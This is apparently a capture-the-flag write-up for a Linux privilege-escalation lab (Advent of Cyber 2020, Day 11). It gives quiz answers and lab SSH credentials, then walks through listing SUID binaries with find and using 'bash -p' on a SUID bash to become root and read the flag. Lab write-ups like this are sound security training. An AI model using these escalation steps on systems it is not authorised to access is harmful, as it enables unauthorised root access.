# [Day 11] Networking - The Rogue Gnome

## Topics

- Linux Privilege Escalation

### 1.  What type of privilege escalation involves using a user account to execute commands as an administrator?
```
vertical
```

### 2. What is the name of the file that contains a list of users who are a part of the sudo group?
```
sudoers
```

### 3. What are the contents of the file located at /root/flag.txt?

1. Use SSH to log in to the machine: `ssh cmnatic@MACHINE-IP`
    - Password: `aoc2020`
2. There's various ways to enumerate the machine. You can use enumeration scripts like __linpeas__ or __LinEnum__ and upload them to the machine like in the explanation. For this case it's a bit overkill, so we are just going to use `find / -perm -u=s -type f 2>/dev/null` to find files with the SUID permission.

__command output:__
```
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/bin/bash
/bin/ping
/snap/core/10444/bin/mount
/snap/core/10444/bin/ping
/snap/core/10444/bin/ping6
/snap/core/10444/bin/su
/snap/core/10444/bin/umount
/snap/core/10444/usr/bin/chfn
/snap/core/10444/usr/bin/chsh
/snap/core/10444/usr/bin/gpasswd
/snap/core/10444/usr/bin/newgrp
/snap/core/10444/usr/bin/passwd
/snap/core/10444/usr/bin/sudo
/snap/core/10444/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/10444/usr/lib/openssh/ssh-keysign
/snap/core/10444/usr/lib/snapd/snap-confine
/snap/core/10444/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
```
Taking a look at the output, we can see various files that could be use to elevate our privileges, one of them being `/bin/bash`.
3. In GTFObins, search for SUID on bash. You should find the following command: `./bash -p`, instead of typing that, use `bash -p`.
4. You should now be root. You can double check with `whoami`
5. Print the flag in `/root/flag.txt`